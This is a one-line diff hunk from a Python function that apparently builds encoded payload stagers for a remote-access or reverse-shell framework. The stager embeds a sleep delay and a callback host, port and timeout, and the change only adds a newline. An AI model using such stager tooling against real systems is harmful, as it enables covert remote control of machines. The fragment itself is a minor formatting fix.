@@ -81,7 +81,7 @@ def get_stager(id: str, encoder: str = "base64", random_size : bool = False, tim
     
     # Replace the Payload
     finished_payload =  start + "\n"
-    finished_payload += f"import time\ntime.sleep({delay})\nHOST = '{address}'\nPORT = {port}\nTIMEOUT = {timeout}\nssl={ssl}"
+    finished_payload += f"import time\ntime.sleep({delay})\nHOST = '{address}'\nPORT = {port}\nTIMEOUT = {timeout}\nssl={ssl}\n"
     finished_payload += payload + "\n" + end
 
     # Encode the Payload
